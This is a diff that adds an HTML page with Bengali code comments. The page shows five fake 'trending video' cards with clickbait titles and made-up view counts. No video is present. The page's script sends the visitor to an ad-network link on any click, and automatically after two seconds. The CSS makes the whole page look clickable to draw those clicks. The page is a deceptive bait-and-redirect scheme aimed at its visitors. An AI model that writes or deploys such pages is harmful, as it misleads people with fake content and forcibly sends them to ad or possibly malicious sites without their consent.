@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trending Videos</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            cursor: pointer; /* স্ক্রিনের যেকোনো জায়গায় মাউস আনলে ক্লিকযোগ্য মনে হবে */
+        }
+
+        body {
+            background-color: #0f0f0f;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            padding: 15px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px; /* মোবাইল ফ্রেন্ডলি সাইজ */
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .page-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #ff0000;
+            text-align: center;
+        }
+
+        .video-card {
+            background-color: #1f1f1f;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            transition: transform 0.2s;
+        }
+
+        .video-card:hover {
+            transform: scale(1.02);
+        }
+
+        .thumbnail-container {
+            position: relative;
+            width: 100%;
+            height: 220px;
+            background-color: #333;
+        }
+
+        .thumbnail-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* ইউটিউব প্লে বাটনের মতো আইকন */
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .play-button::after {
+            content: '';
+            display: block;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 10px 0 10px 18px;
+            border-color: transparent transparent transparent #ffffff;
+            margin-left: 4px;
+        }
+
+        .video-info {
+            padding: 12px;
+        }
+
+        .video-title {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            line-height: 1.3;
+            color: #fff;
+        }
+
+        .video-views {
+            font-size: 13px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2 class="page-title">🔥 Trending Videos Today</h2>
+
+        <!-- ভিডিও ১ -->
+        <div class="video-card">
+            <div class="thumbnail-container">
+                <!-- নিচে src="" এর ভেতর আপনার ১ম ইমেজের লিংক বসান -->
+                <img src="https://i.postimg.cc/2SPdQB5B/1280x720-17717475.webp">
+                <div class="play-button"></div>
+            </div>
+            <div class="video-info">
+                <!-- ভিডিও টাইটেল পরিবর্তন করুন -->
+                <div class="video-title">EXCLUSIVE: New Viral Video Trending Right Now!</div>
+                <!-- ভিউ সংখ্যা পরিবর্তন করুন -->
+                <div class="video-views">1.2M views • 2 hours ago</div>
+            </div>
+        </div>
+
+        <!-- ভিডিও ২ -->
+        <div class="video-card">
+            <div class="thumbnail-container">
+                <!-- নিচে src="" এর ভেতর আপনার ২য় ইমেজের লিংক বসান -->
+                <img src="https://i.postimg.cc/G2jkn7xL/526x298-3.webp" alt="Thumbnail">
+                <div class="play-button"></div>
+            </div>
+            <div class="video-info">
+                <div class="video-title">Must Watch This Shocking Moment Captured On Camera</div>
+                <div class="video-views">850K views • 5 hours ago</div>
+            </div>
+        </div>
+
+        <!-- ভিডিও ৩ -->
+        <div class="video-card">
+            <div class="thumbnail-container">
+                <!-- নিচে src="" এর ভেতর আপনার ৩য় ইমেজের লিংক বসান -->
+                <img src="https://i.postimg.cc/nrRBCX5J/526x298-213.webp" alt="Thumbnail">
+                <div class="play-button"></div>
+            </div>
+            <div class="video-info">
+                <div class="video-title">Top Secret Leaked Video You Shouldn't Miss</div>
+                <div class="video-views">2.5M views • 1 day ago</div>
+            </div>
+        </div>
+
+        <!-- ভিডিও ৪ -->
+        <div class="video-card">
+            <div class="thumbnail-container">
+                <!-- নিচে src="" এর ভেতর আপনার ৪র্থ ইমেজের লিংক বসান -->
+                <img src="https://i.postimg.cc/W1Jg1bwW/1280x720-17718019.webp" alt="Thumbnail">
+                <div class="play-button"></div>
+            </div>
+            <div class="video-info">
+                <div class="video-title">Full Uncut Footage Released Publicly</div>
+                <div class="video-views">500K views • 3 hours ago</div>
+            </div>
+        </div>
+
+        <!-- ভিডিও ৫ -->
+        <div class="video-card">
+            <div class="thumbnail-container">
+                <!-- নিচে src="" এর ভেতর আপনার ৫ম ইমেজের লিংক বসান -->
+                <img src="https://i.postimg.cc/1zmZN7bR/image.png" alt="Thumbnail">
+                <div class="play-button"></div>
+            </div>
+            <div class="video-info">
+                <div class="video-title">Click To Watch Full High Quality Video</div>
+                <div class="video-views">3.1M views • 12 hours ago</div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // আপনার দেয়া এড লিংক
+        const adUrl = "https://www.profitableratecpmnetwork.com/h8y8qdu0ct?key=050521a5e402554eb7c835317c9aa9e0";
+
+        // রিডাইরেক্ট ফাংশন
+        function redirectToAd() {
+            window.location.href = adUrl;
+        }
+
+        // ১. স্ক্রিনের যেকোনো জায়গায় ক্লিক করলে এড এ নিয়ে যাবে
+        document.addEventListener('click', function() {
+            redirectToAd();
+        });
+
+        // ২. ইউজারের কোনো রেসপন্স না থাকলেও ২ সেকেন্ড পর অটোমেটিক রিডাইরেক্ট করবে
+        setTimeout(function() {
+            redirectToAd();
+        }, 2000); // ২০০০ মিলিসেকেন্ড = ২ সেকেন্ড
+    </script>
+
+</body>
+</html>
